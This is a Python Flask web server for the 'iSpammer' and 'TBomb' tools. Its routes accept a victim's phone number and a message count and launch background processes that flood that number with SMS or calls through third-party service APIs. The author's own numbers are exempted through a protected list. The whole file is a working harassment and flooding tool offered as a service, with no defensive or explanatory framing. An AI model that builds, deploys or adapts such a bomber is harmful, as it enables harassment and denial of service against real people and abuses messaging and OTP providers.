from flask import Flask, render_template, redirect, request, jsonify
from api import infinite
from tbomb.utils import provider
import multiprocessing
import call
# from requests import get


app = Flask(__name__)

protected = ["7652932383"]
admin = ["9519874704", ]

@app.route('/')
def index():
    return '<h1>Index Page</h1>'

@app.route('/bomb/<string:mobile_number>/<int:messages>')
def bomb(mobile_number, messages):
    # protected_data = get('https://raw.githubusercontent.com/MrSp4rX/iSpammerApp/main/Protect.list')
    # print(protected_data.json())
    # protected = list(protected_data['protected'])
    # admin = list(protected_data['admin'])
    try:
        mobile_number = int(mobile_number)
        messages = int(messages)
    except:
        return jsonify(
            Response = "Please Provide Correct Parameters.",
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "iSpammer",
            Creator = "MrSp4rX"
        )


    if len(str(mobile_number)) == 10 and int(messages) <= 250 and str(mobile_number) not in protected and str(mobile_number) not in admin:
        bombing = multiprocessing.Process(target=infinite, args=[mobile_number, messages])
        bombing.start()
        return jsonify(
            Response = "Bombing is Being Started",
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "iSpammer",
            Creator = "MrSp4rX"
        )
    
    return jsonify(
        Response = "Something went Wrong",
        Mobile_Number = mobile_number,
        Messages = messages,
        Tool = "iSpammer",
        Creator = "MrSp4rX"
    )

def bombing_loop(cc, mobile_number, mode, times):
    temp = provider.APIProvider(cc, mobile_number, mode)
    for time in range(times):
        temp.hit()

@app.route('/bombint/<int:cc>/<string:mobile_number>/<int:messages>')
def bombint(cc, mobile_number, messages):
    try:
        cc = int(cc)
        mobile_number = int(mobile_number)
        messages = int(messages)
    except:
        return jsonify(
            Response = "Please Provide Correct Parameters.",
            Country_Code = cc,
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "TBomb",
            Creator = "TheSpeedX"
        )

    if int(messages) <= 100 and str(cc)+str(mobile_number) not in protected and str(cc)+str(mobile_number) not in admin and len(str(cc)) <= 3 and str(cc)!="1" and str(cc)!="91":
        bombing = multiprocessing.Process(target=bombing_loop, args=[cc, mobile_number, 'sms', messages])
        bombing.start()
        return jsonify(
            Response = "Bombing is Being Started",
            Country_Code = cc,
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "TBomb",
            Creator = "TheSpeedX"
        )
    
    return jsonify(
        Response = "Something went Wrong",
        Country_Code = cc,
        Mobile_Number = mobile_number,
        Messages = messages,
        Tool = "TBomb",
        Creator = "TheSpeedX"
    )

@app.route('/call-bomb/<int:times>')
def call_bomb(times):
    tempInstance = call.CallBomb(times)
    callBombing = multiprocessing.Process(target=tempInstance.bomb)
    callBombing.start()
    return jsonify(
					Response = "Bombing is Being Started",
					Country_Code = '91',
					Mobile_Number = 9519874704,
					Tool = "iCallBomber",
					Creator = "MrSp4rX"
				)


@app.errorhandler(404)
def errorhandler(e):
    print(e)
    return jsonify(
        Response = str(e)
    )

if __name__=="__main__":
    app.run(debug=True)
